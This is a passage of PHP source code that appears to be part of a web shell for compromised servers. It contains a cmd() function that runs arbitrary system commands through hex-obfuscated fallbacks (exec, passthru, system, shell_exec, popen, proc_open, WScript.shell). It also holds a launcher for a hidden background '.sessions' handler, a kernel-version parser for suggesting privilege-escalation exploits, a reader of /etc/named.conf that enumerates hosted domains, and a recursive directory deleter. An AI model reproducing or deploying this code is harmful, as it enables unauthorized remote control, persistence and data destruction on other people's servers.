            cmd('php ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler') . ' > /dev/null 2>/dev/null &');
        } else {
            failed();
        }
    }
}
function success()
{
    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=success">';
}
function failed()
{
    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=failed">';
}

function formatSize($bytes)
{
    $types = array('<span class="file-size">B</span>', '<span class="file-size">KB</span>', '<span class="file-size">MB</span>', '<span class="file-size">GB</span>', '<span class="file-size">TB</span>');
    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
    return (round($bytes, 2) . " " . $types[$i]);
}

function hx($n)
{
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) {
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}
function unx($y)
{
    $n = '';
    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
    }
    return $n;
}

function suggest_exploit()
{
    $uname = $GLOBALS['fungsi'][8]();
    $xplod = explode(" ", $uname);
    $xpld = explode("-", $xplod[2]);
    $pl = explode(".", $xpld[0]);
    return $pl[0] . "." . $pl[1] . "." . $pl[2];
}
function s()
{
    $d0mains = @$GLOBALS['fungsi'][7]("/etc/named.conf", false);
    if (!$d0mains) {
        $dom = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
        $GLOBALS["need_to_update_header"] = "true";
    } else {
        $count = 0;
        foreach ($d0mains as $d0main) {
            if (@strstr($d0main, "zone")) {
                preg_match_all('#zone "(.*)"#', $d0main, $domains);
                flush();
                if (strlen(trim($domains[1][0])) > 2) {
                    flush();
                    $count++;
                }
            }
        }
        $dom = "$count Domain";
    }
    return $dom;
}

function cmd($in, $re = false)
{
    $out = '';
    try {
        if ($re) $in = $in . " 2>&1";
        if (function_exists("\x65\x78\x65\x63")) {
            @$GLOBALS['fungsi'][16]($in, $out);
            $out = @join("\n", $out);
        } elseif (function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")) {
            ob_start();
            @$GLOBALS['fungsi'][17]($in);
            $out = ob_get_clean();
        } elseif (function_exists("\x73\x79\x73\x74\x65\x6d")) {
            ob_start();
            @$GLOBALS['fungsi'][18]($in);
            $out = ob_get_clean();
        } elseif (function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) {
            $out = $GLOBALS['fungsi'][19]($in);
        } elseif (function_exists("\x70\x6f\x70\x65\x6e") && function_exists("\x70\x63\x6c\x6f\x73\x65")) {
            if (is_resource($f = @$GLOBALS['fungsi'][20]($in, "r"))) {
                $out = "";
                while (!@feof($f))
                    $out .= fread($f, 1024);
                $GLOBALS['fungsi'][21]($f);
            }
        } elseif (function_exists("\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e")) {
            $pipes = array();
            $process = @$GLOBALS['fungsi'][23]($in . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
            $out = @$GLOBALS['fungsi'][22]($pipes[1]);
        } elseif (class_exists('COM')) {
            $alfaWs = new COM('WScript.shell');
            $exec = $alfaWs->$GLOBALS['fungsi'][16]('cmd.exe /c ' . $_POST['alfa1']);
            $stdout = $exec->StdOut();
            $out = $stdout->ReadAll();
        }
    } catch (Exception $e) {
    }
    return $out;
}


function unlinkDir($dir)
{
    $dirs = array($dir);
    $files = array();
    for ($i = 0;; $i++) {
        if (isset($dirs[$i]))
            $dir =  $dirs[$i];
        else
            break;

        if ($openDir = opendir($dir)) {
            while ($readDir = @readdir($openDir)) {
                if ($readDir != "." && $readDir != "..") {

                    if ($GLOBALS['fungsi'][2]($dir . "/" . $readDir)) {
                        $dirs[] = $dir . "/" . $readDir;
                    } else {

                        $files[] = $dir . "/" . $readDir;
                    }
                }
            }
        }
    }



    foreach ($files as $file) {
        $GLOBALS['fungsi'][24]($file);
    }
    $dirs = array_reverse($dirs);
    foreach ($dirs as $dir) {
        $GLOBALS['fungsi'][25]($dir);
    }
}

function remove_dot($file)
{
    $FILES = $file;
    $pch = explode(".", $FILES);
    return $pch[0];
}

function perms($file)
{
    $perms = $GLOBALS['fungsi'][6]($file);
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } else {
        // Unknown
        $info = 'u';
    }
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
?>
